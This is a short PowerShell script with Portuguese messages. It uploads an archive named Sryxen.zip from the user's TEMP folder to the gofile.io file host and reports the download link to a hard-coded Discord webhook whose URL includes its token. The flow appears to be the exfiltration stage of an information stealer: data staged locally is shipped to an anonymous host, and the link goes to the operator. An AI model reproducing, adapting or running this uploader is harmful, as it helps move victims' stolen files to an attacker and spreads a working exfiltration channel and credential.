$Arquivo = "$env:TEMP\Sryxen.zip"
$WebhookUrl = "https://discord.com/api/webhooks/1270835203459514369/4UHEk8vPl2JsHErqtRomcOyOf8AB__dVzVERYGwzotBSoIKOLYSItyQOJJuXcnlqtLF3"

if (Test-Path $Arquivo) {
    try {
        $UploadUrl = "https://upload.gofile.io/uploadfile"
        $FileName  = [System.IO.Path]::GetFileName($Arquivo)
        $FileSize  = [Math]::Round((Get-Item $Arquivo).Length / 1MB, 2) # tamanho em MB
        $Boundary  = [System.Guid]::NewGuid().ToString()
        $LF        = "`r`n"

        $Header  = "--$Boundary$LF"
        $Header += "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"$LF"
        $Header += "Content-Type: application/octet-stream$LF$LF"

        $Footer = "$LF--$Boundary--$LF"

        $HeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($Header)
        $FileBytes   = [System.IO.File]::ReadAllBytes($Arquivo)
        $FooterBytes = [System.Text.Encoding]::UTF8.GetBytes($Footer)

        $Body = New-Object System.IO.MemoryStream
        $Body.Write($HeaderBytes, 0, $HeaderBytes.Length)
        $Body.Write($FileBytes,   0, $FileBytes.Length)
        $Body.Write($FooterBytes, 0, $FooterBytes.Length)
        $Body.Seek(0, 'Begin') | Out-Null

        $Headers = @{
            "Content-Type" = "multipart/form-data; boundary=$Boundary"
        }

        $Response = Invoke-RestMethod -Uri $UploadUrl -Method Post -Body $Body -Headers $Headers

        if ($Response.status -eq "ok") {
            $Link = $Response.data.downloadPage
            Write-Host "Upload concluído. Link: $Link" -ForegroundColor Green

            # Monta mensagem personalizada para o Discord
            $Mensagem = @"
📦 **Arquivo enviado para GoFile**
📄 Nome: $FileName
📏 Tamanho: ${FileSize}MB
🔗 Link: $Link
"@

            $Payload = @{
                content = $Mensagem
            }

            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body ($Payload | ConvertTo-Json -Compress) -ContentType "application/json"
            Write-Host "Link enviado para o Discord." -ForegroundColor Cyan
        }
        else {
            Write-Host "Erro no upload: $($Response.message)" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Erro no upload: $($_.Exception.Message)" -ForegroundColor Red
    }
}
else {
    Write-Host "Erro: sryxen.zip não encontrado em $env:TEMP" -ForegroundColor Red
}
